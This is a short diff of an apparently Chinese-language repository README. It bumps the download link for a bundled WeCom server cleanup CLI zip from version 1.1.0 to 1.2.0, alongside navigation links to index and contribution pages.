@@ -6,7 +6,7 @@
 
 [索引页（可视化）](docs/index.html) · [总索引](INDEX.md) · [机器可读索引](index.json) · [Agent 接入说明](AGENTS.md) · [贡献指南](CONTRIBUTING.md)
 
-附带工具：[企业微信服务器清理 CLI](tools/wecom-clean/README.md) · [下载清理工具包](https://github.com/PoryfForge/Cli/raw/refs/heads/main/tools/wecom-clean/WeCom-Clean-CLI-1.1.0.zip)
+附带工具：[企业微信服务器清理 CLI](tools/wecom-clean/README.md) · [下载清理工具包](https://github.com/PoryfForge/Cli/raw/refs/heads/main/tools/wecom-clean/WeCom-Clean-CLI-1.2.0.zip)
 
 ---
 
